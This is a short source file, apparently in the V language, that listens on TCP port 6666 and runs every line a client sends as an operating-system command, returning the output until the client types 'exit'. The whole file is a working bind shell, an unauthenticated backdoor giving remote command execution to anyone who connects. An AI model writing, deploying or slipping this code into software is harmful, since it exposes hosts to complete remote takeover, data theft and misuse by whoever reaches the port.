import net
import os

fn main(){
        mut listener := net.listen_tcp(6666)?
        addr := listener.address()?
        println("Listen on: "+addr.str())

        for{
                mut conn := listener.accept()?
                println(conn)
                mut exit := false
                for exit == false{
                        conn.wait_for_read()?
                        buffer := conn.read_line()
                        // print(buffer)	// debugging
                        if buffer != "exit\n"{
                                output := os.exec(buffer)?
                                conn.write_str(output.str()+"\n")?
                        }else{
                                conn.write_str("Bye\n")?
                                exit = true
                        }       
                }
                conn.close()?
        }
        listener.close()?
}